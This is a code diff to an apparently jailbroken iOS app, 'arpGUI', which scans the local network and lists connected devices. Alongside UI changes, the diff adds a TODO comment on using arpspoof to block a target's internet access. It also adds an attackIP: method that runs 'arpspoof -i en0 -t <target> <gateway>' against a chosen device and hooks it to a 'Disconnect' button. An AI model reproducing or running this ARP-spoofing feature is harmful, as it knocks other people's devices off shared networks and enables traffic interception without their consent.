@@ -15,6 +15,9 @@
 @property UIRefreshControl *refreshControl;
 @end
 
+//TODO to block internet, do arpspoof -i [interfaceName] -t [target] [gateway](I need to figure out if this can be anything, or must be the box).
+
+
 @implementation ViewController 
 {
     NSMutableArray<NSString *> *tableData;
@@ -36,7 +39,11 @@
     [self.refreshControl addTarget:self
                             action:@selector(refreshDevices)
                   forControlEvents:UIControlEventValueChanged];
-    self.refreshControl.
+    NSString *title = [NSString stringWithFormat:@"Checking for Devices..."];
+    NSDictionary *attrsDictionary = [NSDictionary dictionaryWithObject:[UIColor whiteColor]
+                                                                forKey:NSForegroundColorAttributeName];
+    NSAttributedString *attributedTitle = [[NSAttributedString alloc] initWithString:title attributes:attrsDictionary];
+    self.refreshControl.attributedTitle = attributedTitle;
     
     self.tableView.refreshControl = self.refreshControl;
     //Device Arrays
@@ -47,8 +54,6 @@
     self.view.backgroundColor = [UIColor blackColor];
 }
 -(void)viewDidAppear:(BOOL)animated{
-    /*fullInfo = [[[self getFullOutput] componentsSeparatedByString:@"\n"]mutableCopy];
-    tableData = [[self createArrays:fullInfo]mutableCopy];*/
     self.navigationItem.title = @"Getting Devices";
     [self refreshDevices];
 }
@@ -73,14 +78,35 @@
 }
 
 - (void)refreshDevices{
+    self.tableView.backgroundColor = [UIColor blackColor];
     [fullInfo removeAllObjects];
     [tableData removeAllObjects];
     fullInfo = [[[self getFullOutput] componentsSeparatedByString:@"\n"]mutableCopy];
     tableData = [[self createArrays:fullInfo]mutableCopy];
+    hostName = [self getHostNames:ipAdress];
+    dispatch_async(dispatch_get_main_queue(), ^{
     [self.tableView reloadData];
-    [[NSOperationQueue currentQueue] addOperationWithBlock:^{
     [self.refreshControl endRefreshing];
-    }];
+        if(!self->tableData.count){
+            [self displayNoDevicesAlert];
+        }
+    });
+}
+
+- (void)displayNoDevicesAlert{
+    UILabel *messageLabel = [[UILabel alloc] initWithFrame:CGRectMake(0, 0, self.view.bounds.size.width, self.view.bounds.size.height)];
+    
+    messageLabel.text = @"No devices connected. \n Please enable Wifi/Hotspot and pull to refresh.";
+    messageLabel.textColor = [UIColor whiteColor];
+    messageLabel.numberOfLines = 0;
+    messageLabel.textAlignment = NSTextAlignmentCenter;
+    messageLabel.font = [UIFont systemFontOfSize:20];
+    [messageLabel sizeToFit];
+    
+    self.tableView.backgroundView = messageLabel;
+    self.tableView.backgroundColor = [UIColor blackColor];
+    self.tableView.separatorStyle = UITableViewCellSeparatorStyleNone;
+    self.navigationItem.title =  @"arpGUI: Unavailable";
 }
 
 - (NSString *)getFullOutput{
@@ -90,6 +116,26 @@
     self.navigationItem.title =  [NSString stringWithFormat:@"arpGUI: %@", [availableInterfaces length] > 0 ? @"HotSpot" : @"Wifi" ];
     
     return resultsForCommand(command);//(@"/usr/bin/crux /usr/local/bin/arp-scan -interface en0 --localnet | grep  '[0-9]\\{1,3\\}\\.[0-9]\\{1,3\\}\\.[0-9]\\{1,3\\}\\.[0-9]\\{1,3\\}' | sort -V");
+}
+
+- (NSMutableArray<NSString *> *)getHostNames:(NSArray *)sourceArray{
+    NSMutableArray *returnArray = [NSMutableArray new];
+    for(NSString *ip in sourceArray){
+        NSString *command = [NSString stringWithFormat:@"arp %@", ip];
+        NSString *commandOutput = resultsForCommand(command);
+        NSArray *components = [NSArray new];
+        components = [commandOutput componentsSeparatedByCharactersInSet:[NSCharacterSet whitespaceCharacterSet]];
+        if (components.count){
+            [returnArray addObject:components[0]];
+        }
+    }
+    return returnArray;
+}
+
+- (void)attackIP:(NSString *)address{
+    NSString *gateway = resultsForCommand(@"/sbin/route -n get default | grep 'gateway' | awk '{print $2}'");
+    NSString *output = resultsForCommand([NSString stringWithFormat:@"arpspoof -i en0 -t %@ %@", address, gateway]);
+    NSLog(@"%@", output);
 }
 
 
@@ -103,12 +149,6 @@
     static NSString *simpleTableIdentifier = @"SimpleTableItem";
     tableView.backgroundColor = [UIColor blackColor];
     
-    /*UITableViewCell *cell = [tableView dequeueReusableCellWithIdentifier:simpleTableIdentifier];
-    
-    if (cell == nil) {
-        cell = [[UITableViewCell alloc] initWithStyle:UITableViewCellStyleDefault reuseIdentifier:simpleTableIdentifier];
-    }*/
-    
     UITableViewCell *cell = [tableView dequeueReusableCellWithIdentifier:simpleTableIdentifier];
     
     if (cell == nil) {
@@ -119,35 +159,17 @@
     cell.textLabel.textColor = [UIColor whiteColor];
     cell.detailTextLabel.textColor = [UIColor whiteColor];
     cell.textLabel.text = [tableData objectAtIndex:indexPath.row];
-    cell.detailTextLabel.text = @"Hey I work";
+    cell.detailTextLabel.text = [hostName objectAtIndex:indexPath.row];
     
     UIView *bgColorView = [[UIView alloc] init];
-    bgColorView.backgroundColor = [UIColor redColor];
+    bgColorView.backgroundColor = [[UIColor blueColor] colorWithAlphaComponent:0.25]; //[UIColor redColor];
     [cell setSelectedBackgroundView:bgColorView];
     return cell;
 }
 
 
 - (NSInteger)tableView:(nonnull UITableView *)tableView numberOfRowsInSection:(NSInteger)section {
-    if([tableData count]){
-        return [tableData count];
-    }
-    else{
-        UILabel *messageLabel = [[UILabel alloc] initWithFrame:CGRectMake(0, 0, self.view.bounds.size.width, self.view.bounds.size.height)];
-        
-        messageLabel.text = @"No devices connected. \n Please enable Wifi/Hotspot and pull to refresh.";
-        messageLabel.textColor = [UIColor whiteColor];
-        messageLabel.numberOfLines = 0;
-        messageLabel.textAlignment = NSTextAlignmentCenter;
-        messageLabel.font = [UIFont systemFontOfSize:20];
-        [messageLabel sizeToFit];
-        
-        tableView.backgroundView = messageLabel;
-        tableView.backgroundColor = [UIColor blackColor];
-        tableView.separatorStyle = UITableViewCellSeparatorStyleNone;
-        self.navigationItem.title =  @"arpGUI: Unavailable";
-        return 0;
-    }
+    return [tableData count];
 }
 
 - (void)tableView:(UITableView *)tableView didSelectRowAtIndexPath:(NSIndexPath *)indexPath{ //[fullInfo objectAtIndex:indexPath.row]
@@ -155,11 +177,32 @@
     UIAlertController *alert = [UIAlertController alertControllerWithTitle:[tableData objectAtIndex:indexPath.row] message:deviceInfo preferredStyle:UIAlertControllerStyleAlert];
     
     UIAlertAction *okAction = [UIAlertAction actionWithTitle:@"Okay" style:UIAlertActionStyleDefault handler:nil];
+    UIAlertAction *attackAction = [UIAlertAction actionWithTitle:@"Disconnect" style:UIAlertActionStyleDestructive handler:^(UIAlertAction * action) {
+        [self attackIP:[self->ipAdress objectAtIndex:indexPath.row]];
+    }];
     [alert addAction:okAction];
+    [alert addAction:attackAction];
     
     [self presentViewController:alert animated:YES completion:nil];
     
     [tableView deselectRowAtIndexPath:indexPath animated:YES];
+}
+
+
+//Copy and paste the IP
+- (BOOL)tableView:(UITableView *)tableView shouldShowMenuForRowAtIndexPath:(NSIndexPath *)indexPath{
+    return YES;
+}
+
+- (BOOL)tableView:(UITableView *)tableView canPerformAction:(SEL)action forRowAtIndexPath:(NSIndexPath *)indexPath withSender:(id)sender{
+    return (action == @selector(copy:));
+}
+
+- (void)tableView:(UITableView *)tableView performAction:(SEL)action forRowAtIndexPath:(NSIndexPath *)indexPath withSender:(id)sender{
+    if (action == @selector(copy:)){
+        UITableViewCell *cell = [tableView cellForRowAtIndexPath:indexPath];
+        [[UIPasteboard generalPasteboard] setString:cell.textLabel.text];
+    }
 }
 
 /*- (void)encodeWithCoder:(nonnull NSCoder *)aCoder {
